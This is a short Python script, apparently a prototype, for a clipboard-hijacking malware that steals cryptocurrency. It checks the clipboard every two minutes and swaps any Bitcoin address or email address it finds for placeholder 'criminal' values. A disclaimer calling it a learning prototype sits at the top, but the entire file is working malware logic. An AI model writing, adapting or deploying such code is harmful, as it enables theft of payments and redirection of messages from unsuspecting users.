# This prototype is being developed for learning. DO NOT USE for illegal activities.

from time import sleep
from re import match
import clipboard

wallet = "CriminalWallet"
mail = "CriminalEmail"
wallet_pattern = "(bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|[13][a-km-zA-HJ-NP-Z1-9]{25,35})"
mail_pattern = "\S+@\S+"

def check_address(string):
    if match(wallet_pattern, string):
        clipboard.copy(wallet)
    if match(mail_pattern, string):
        clipboard.copy(mail)
    else:
        pass

while True:
    text_on_clipboard = clipboard.paste()
    check_address(text_on_clipboard)
    sleep(120)
    
